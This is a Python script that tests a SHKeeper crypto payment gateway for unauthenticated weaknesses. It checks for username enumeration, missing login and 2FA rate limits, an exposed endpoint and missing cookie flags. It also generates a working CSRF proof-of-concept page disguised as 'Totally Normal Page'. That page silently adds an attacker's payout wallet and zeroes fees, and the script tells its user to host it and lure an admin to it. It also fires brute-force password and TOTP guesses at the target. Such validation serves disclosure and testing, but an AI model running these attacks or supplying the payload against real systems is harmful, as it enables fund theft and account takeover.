#!/usr/bin/env python3
"""
SHKeeper OUTSIDER Validator — ZERO credentials, ZERO API keys

Tests what a random internet attacker can do with nothing.

Usage:
    python3 validate_findings.py --target https://domain.com
"""

import argparse
import json
import sys
import time
import requests
from urllib.parse import urljoin

requests.packages.urllib3.disable_warnings()

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
B = "\033[1m"
E = "\033[0m"

findings = []


def vuln(fid, title, proof):
    findings.append({"id": fid, "status": "VULN", "title": title, "proof": proof})
    print(f"  {R}[VULN]{E} #{fid} {title}")
    for line in proof.split("\n"):
        print(f"         {line}")
    print()


def safe(fid, title, reason):
    findings.append({"id": fid, "status": "SAFE", "title": title, "proof": reason})
    print(f"  {G}[SAFE]{E} #{fid} {title} — {reason}\n")


def skip(fid, title, reason):
    findings.append({"id": fid, "status": "SKIP", "title": title, "proof": reason})
    print(f"  {Y}[SKIP]{E} #{fid} {title} — {reason}\n")


# ==========================================================================
# #1  Username Enumeration
#
# auth.py:148: "Incorrect username."
# auth.py:153: "Incorrect password."
# Different error = attacker learns valid usernames.
# ==========================================================================
def test_username_enum(target):
    fid = 1
    title = "Username Enumeration"
    s = requests.Session()
    s.verify = False

    try:
        r1 = s.post(urljoin(target, "/login"),
                     data={"name": "nonexistent_user_xyz_999", "password": "x"},
                     allow_redirects=False)
        r2 = s.post(urljoin(target, "/login"),
                     data={"name": "admin", "password": "wrong_pw_123"},
                     allow_redirects=False)
    except Exception as e:
        return skip(fid, title, str(e))

    b1 = r1.text.lower()
    b2 = r2.text.lower()

    has_user_msg = "incorrect username" in b1
    has_pass_msg = "incorrect password" in b2
    redir_2fa = r2.status_code in (302, 303) and "2fa" in r2.headers.get("Location", "")

    if has_user_msg and (has_pass_msg or redir_2fa):
        vuln(fid, title,
            "POST /login with fake user → 'Incorrect username.'\n"
            "POST /login with 'admin' → 'Incorrect password.' (or 2FA redirect)\n"
            "auth.py:148 vs :153 — different messages reveal valid usernames.")
    elif has_user_msg and not has_pass_msg:
        vuln(fid, title,
            "Response for fake user contains 'Incorrect username.'\n"
            "Response for 'admin' is different → confirms 'admin' exists.")
    elif b1 != b2:
        vuln(fid, title,
            f"Response bodies differ (len {len(r1.text)} vs {len(r2.text)}).\n"
            "Even without explicit message, difference enables enumeration.")
    else:
        safe(fid, title, "identical responses for valid and invalid usernames")


# ==========================================================================
# #2  No Brute Force Protection on Login
#
# auth.py:138-174 — no rate limit, no lockout, no captcha.
# ==========================================================================
def test_login_bruteforce(target):
    fid = 2
    title = "No Brute Force Protection on Login"
    s = requests.Session()
    s.verify = False
    n = 30

    try:
        for i in range(n):
            r = s.post(urljoin(target, "/login"),
                       data={"name": "admin", "password": f"wrong_{i}"},
                       allow_redirects=False)
            if r.status_code == 429:
                return safe(fid, title, f"429 after {i+1} attempts")
            txt = r.text.lower()
            if any(x in txt for x in ["locked", "too many", "rate limit", "try again later", "blocked"]):
                return safe(fid, title, f"blocked after {i+1} attempts")
    except Exception as e:
        return skip(fid, title, str(e))

    vuln(fid, title,
        f"Sent {n} wrong passwords for 'admin' — all accepted, zero protection.\n"
        "No 429, no lockout, no captcha, no delay.\n"
        "Attacker runs dictionary/brute force forever.")


# ==========================================================================
# #3  No CSRF Protection — outsider hijacks admin actions
#
# No csrf_token in any form. No Flask-WTF. No SameSite cookie.
# Outsider hosts HTML page → admin visits → attacker executes actions.
# ==========================================================================
def test_csrf(target):
    fid = 3
    title = "No CSRF Protection (outsider hijacks admin actions)"
    s = requests.Session()
    s.verify = False

    try:
        r = s.get(urljoin(target, "/login"), timeout=10)
    except Exception as e:
        return skip(fid, title, str(e))

    body = r.text.lower()
    has_csrf = any(x in body for x in ["csrf_token", "csrf-token", "csrfmiddlewaretoken", "_token", "csrftoken"])

    if has_csrf:
        return safe(fid, title, "csrf token found in login form")

    vuln(fid, title,
        "Login form has NO csrf_token. Checked entire codebase: zero CSRF protection.\n"
        "Outsider attack: host a page, admin visits while logged in → auto-submits:\n"
        f"  <form action=\"{target}/rates/USD\" method=\"POST\">\n"
        f"    <input name=\"rates__BTC__fee\" value=\"0\">\n"
        f"    <input name=\"rates__BTC__source\" value=\"manual\">\n"
        f"    <input name=\"rates__BTC__rate\" value=\"1\">\n"
        "  </form><script>document.forms[0].submit()</script>\n"
        "→ Zeroes all processing fees. Same attack for:\n"
        "  - Add attacker payout destination (POST /api/v1/BTC/payout_destinations)\n"
        "  - Change API keys (POST /api/v1/BTC/payment-gateway/token)\n"
        "  - Trigger payouts (POST /api/v1/BTC/payout)\n"
        "  - Disable 2FA (POST /2fa/disable)")


# ==========================================================================
# #4  No 2FA Brute Force Protection
#
# auth.py:199-247 — 5 min window, zero rate limit.
# TOTP = 6 digits. valid_window=1 = 3 codes valid simultaneously.
# ==========================================================================
def test_2fa_bruteforce(target):
    fid = 4
    title = "No 2FA Brute Force Protection"
    s = requests.Session()
    s.verify = False
    n = 30

    try:
        blocked = False
        for i in range(n):
            r = s.post(urljoin(target, "/2fa/verify"),
                       data={"token": f"{i:06d}"},
                       allow_redirects=False)
            if r.status_code == 429:
                blocked = True
                break
            txt = r.text.lower()
            if any(x in txt for x in ["too many", "rate limit", "locked", "blocked"]):
                blocked = True
                break
    except Exception as e:
        return skip(fid, title, str(e))

    if blocked:
        safe(fid, title, f"rate limited after {i+1} attempts")
    else:
        vuln(fid, title,
            f"Sent {n} TOTP guesses to POST /2fa/verify — no rate limit.\n"
            "auth.py:224-237 has zero protection. TOTP = 6 digits = 1M codes.\n"
            "valid_window=1 → 3 codes valid at once.\n"
            "Attack: brute force passwords (finding #2), then when 2FA prompt appears,\n"
            "  spray TOTP codes at 50 req/sec × 300 sec = 15,000 guesses per session.\n"
            "  3/1,000,000 × 15,000 = ~4.5% chance per session. Repeat until in.")


# ==========================================================================
# #5  Unauthenticated Endpoint — /api/v1/crypto
#
# api_v1.py:63 — no @api_key_required, no @login_required.
# Reveals all enabled crypto currencies to anyone.
# ==========================================================================
def test_unauth_crypto_list(target):
    fid = 5
    title = "Unauthenticated Crypto Listing (/api/v1/crypto)"

    try:
        r = requests.get(urljoin(target, "/api/v1/crypto"), verify=False, timeout=10)
    except Exception as e:
        return skip(fid, title, str(e))

    if r.status_code in (401, 403):
        return safe(fid, title, f"returned {r.status_code}")

    try:
        data = r.json()
    except Exception:
        return skip(fid, title, "non-JSON response")

    cryptos = data.get("crypto_list") or data.get("crypto") or []
    names = [c if isinstance(c, str) else c.get("crypto", str(c)) for c in cryptos[:15]]

    if r.status_code == 200 and names:
        vuln(fid, title,
            f"GET /api/v1/crypto with ZERO auth → HTTP 200.\n"
            f"Enabled cryptos: {', '.join(names)}\n"
            "api_v1.py:63 has no auth decorator. Reveals wallet infrastructure.")
    elif r.status_code == 200:
        vuln(fid, title, "endpoint returns 200 with no auth (empty list)")
    else:
        safe(fid, title, f"HTTP {r.status_code}")


# ==========================================================================
# #6  Session Cookie Flags
#
# Missing HttpOnly → XSS steals session
# Missing Secure → session over plain HTTP
# Missing SameSite → CSRF via cookie
# ==========================================================================
def test_cookie_flags(target):
    fid = 6
    title = "Session Cookie Security Flags"
    s = requests.Session()
    s.verify = False

    try:
        r = s.get(urljoin(target, "/login"), timeout=10)
        if not r.headers.get("Set-Cookie"):
            r = s.post(urljoin(target, "/login"),
                       data={"name": "x", "password": "x"}, allow_redirects=False)
    except Exception as e:
        return skip(fid, title, str(e))

    raw = r.headers.get("Set-Cookie", "")
    if not raw:
        return skip(fid, title, "no Set-Cookie header received")

    ck = raw.lower()
    issues = []
    if "httponly" not in ck:
        issues.append("No HttpOnly → XSS steals session via document.cookie")
    if "secure" not in ck and target.startswith("https"):
        issues.append("No Secure → cookie sent over plain HTTP")
    if "samesite" not in ck:
        issues.append("No SameSite → amplifies CSRF (finding #3)")

    if issues:
        vuln(fid, title,
            f"Set-Cookie: {raw[:200]}\n" + "\n".join(issues))
    else:
        safe(fid, title, "HttpOnly + Secure + SameSite all present")


# ==========================================================================
# Generate CSRF PoC HTML
# ==========================================================================
def generate_csrf_poc(target):
    try:
        r = requests.get(urljoin(target, "/api/v1/crypto"), verify=False, timeout=5)
        data = r.json()
        cl = data.get("crypto_list") or data.get("crypto") or []
        crypto = cl[0] if cl else "BTC"
        if not isinstance(crypto, str):
            crypto = crypto.get("crypto", "BTC")
    except Exception:
        crypto = "BTC"

    poc = f"""<!DOCTYPE html>
<html>
<head><title>Totally Normal Page</title></head>
<body>
<h2>Please wait...</h2>

<!-- Attack 1: add attacker's payout destination -->
<iframe name="f1" style="display:none"></iframe>
<form id="a1" method="POST" target="f1"
      action="{target}/api/v1/{crypto}/payout_destinations">
  <input name="action" value="add">
  <input name="daddress" value="PUT_YOUR_WALLET_ADDRESS_HERE">
  <input name="dcomment" value="office">
</form>

<!-- Attack 2: zero all processing fees -->
<iframe name="f2" style="display:none"></iframe>
<form id="a2" method="POST" target="f2" action="{target}/rates/USD">
  <input name="rates__{crypto}__source" value="manual">
  <input name="rates__{crypto}__rate" value="50000">
  <input name="rates__{crypto}__fee" value="0">
  <input name="rates__{crypto}__fixed_fee" value="0">
</form>

<script>
document.getElementById('a1').submit();
setTimeout(function() {{ document.getElementById('a2').submit(); }}, 300);
</script>
</body>
</html>"""

    with open("csrf_poc.html", "w") as f:
        f.write(poc)


def main():
    p = argparse.ArgumentParser(description="SHKeeper OUTSIDER Validator (zero credentials)")
    p.add_argument("--target", required=True, help="e.g. https://domain.com")
    a = p.parse_args()
    a.target = a.target.rstrip("/")

    print(f"\n{B}{'='*55}")
    print(f" SHKeeper OUTSIDER Validator")
    print(f" Zero credentials. Zero API keys. Pure external.")
    print(f" Target: {a.target}")
    print(f"{'='*55}{E}\n")

    try:
        r = requests.get(urljoin(a.target, "/login"), verify=False, timeout=10)
        print(f"  {C}[OK]{E} Target reachable\n")
    except Exception as e:
        print(f"  {R}[FAIL]{E} {e}")
        sys.exit(1)

    print(f"{B}--- Broken Authentication ---{E}\n")
    test_username_enum(a.target)
    test_login_bruteforce(a.target)
    test_2fa_bruteforce(a.target)

    print(f"{B}--- Cross-Site Request Forgery ---{E}\n")
    test_csrf(a.target)

    print(f"{B}--- Information Disclosure ---{E}\n")
    test_unauth_crypto_list(a.target)
    test_cookie_flags(a.target)

    # Summary
    v = sum(1 for f in findings if f["status"] == "VULN")
    s = sum(1 for f in findings if f["status"] == "SAFE")
    sk = sum(1 for f in findings if f["status"] == "SKIP")

    print(f"{B}{'='*55}")
    print(f" RESULTS")
    print(f"{'='*55}{E}\n")
    for f in findings:
        c = R if f["status"] == "VULN" else G if f["status"] == "SAFE" else Y
        print(f"  {c}[{f['status']:>4}]{E} #{f['id']} {f['title']}")
    print(f"\n  {R}VULN: {v}{E}  {G}SAFE: {s}{E}  {Y}SKIP: {sk}{E}\n")

    with open("validation_results.json", "w") as fp:
        json.dump({"target": a.target, "ts": int(time.time()), "findings": findings}, fp, indent=2)

    generate_csrf_poc(a.target)

    print(f"  Results  → validation_results.json")
    print(f"  CSRF PoC → csrf_poc.html  (host it, have admin visit while logged in)\n")


if __name__ == "__main__":
    main()
